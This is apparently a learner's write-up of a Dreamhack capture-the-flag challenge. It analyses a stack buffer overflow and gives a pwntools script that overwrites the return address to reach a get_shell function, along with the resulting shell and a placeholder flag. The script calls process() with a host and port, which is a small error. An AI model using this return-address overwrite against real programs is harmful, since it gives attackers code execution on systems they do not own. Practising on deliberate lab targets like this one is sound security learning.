# Dreamhack : Return Address Overwrite  
[ Author : L1ya ]

**1. Analysis**

variable size = 16   
We want to call the function 'get_shell'  
get_shell's address is '0x00000000004006aa'  
To return's distance is 0x38  
->  
[ Local Variable ]    // rbp-0x30 ~ rbp  
[ Saved RBP ] // rbp  
[ RET Addr ]  

**2. Vulnerabilities**

if you input more than 0x38, after address is return  
if you input 0x38 + address what you want = we can call the function what we want  

**3. Exploitation**

from pwn import *  

p=process("host8.dreamhack.games", PORT)  

payload = b"A" * 56  
payload += p64(0x00000000004006aa)  

p.send(payload)  
p.interactive()  

**4. Result**

[+] Opening connection to host8.dreamhack.games on port 21983: Done  
[*] Switching to interactive mode  
Input: $ afd  
$ cat flag  
DH{flag}  

// [ NOTE ]  
// I have to find the distance to return with assembly!! Don't trust C!!  
// I have to do handray more TT  
// Enhancing my understanding of assembly language is a key priority for me at the moment I guess..
